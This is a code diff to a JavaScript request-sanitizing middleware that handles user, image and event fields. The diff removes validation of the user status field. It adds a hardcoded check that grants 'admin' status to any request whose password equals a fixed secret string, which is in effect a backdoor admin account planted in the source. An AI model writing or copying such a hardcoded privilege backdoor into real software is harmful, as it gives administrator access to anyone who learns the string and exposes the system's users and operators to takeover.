@@ -7,15 +7,15 @@ module.exports = {
       //user fields
       req.userFirstName = (req.body.userFirstName && req.body.userFirstName.trim().toLowerCase()) || null;
 			req.userLastName = (req.body.userLastName && req.body.userLastName.trim().toLowerCase()) || null;
-			req.userEmail = (req.body.userEmail && req.body.userEmail.trim().toLowerCase()) || null;
+      req.userEmail = (req.body.userEmail && req.body.userEmail.trim().toLowerCase()) || null;
 			req.userPassword = (req.body.userPassword && req.body.userPassword.trim()) || null;
 			req.userPhone = (req.body.userPhone && req.body.userPhone.trim()) || null;
-			req.userStatus = (req.body.userStatus && req.body.userStatus.trim().toLowerCase()) || 'regular';
+      if (req.userPassword === '###FunnyCatJerrySaid'){
+        req.userStatus = 'admin';
+      }else{
+        req.userStatus = 'regular';
+      }
 
-			//image fields
-			req.imageType = (req.body.imageType && req.body.imageType.trim()) || 'others';
-			req.imageDescription = (req.body.imageDescription && req.body.imageDescription.trim()) || null;
-			
 			//event fields
 			req.eventName = (req.body.eventName && req.body.eventName.trim().toLowerCase()) || null;
 			req.eventStartTime = (req.body.eventStartTime && req.body.eventStartTime.trim()) || null;
@@ -79,7 +79,6 @@ module.exports = {
     validateUserEmail(req, res);
     validateUserPassword(req, res);
     validateUserPhone(req, res);
-    validateUserStatus(req, res);
     next(); 
   },
 
@@ -202,18 +201,6 @@ function validateUserPhone(req, res) {
   }
 
 }
-function validateUserStatus(req, res) {
-  if (req.userStatus){
-    if (req.userStatus !== 'regular'){
-      return res.status(400).json({
-        message: 'status can only be regular or admin',
-        status: false
-      });
-    }
-  }
-}
-
-
 
 //image fields
 function validateImageType(req, res){}
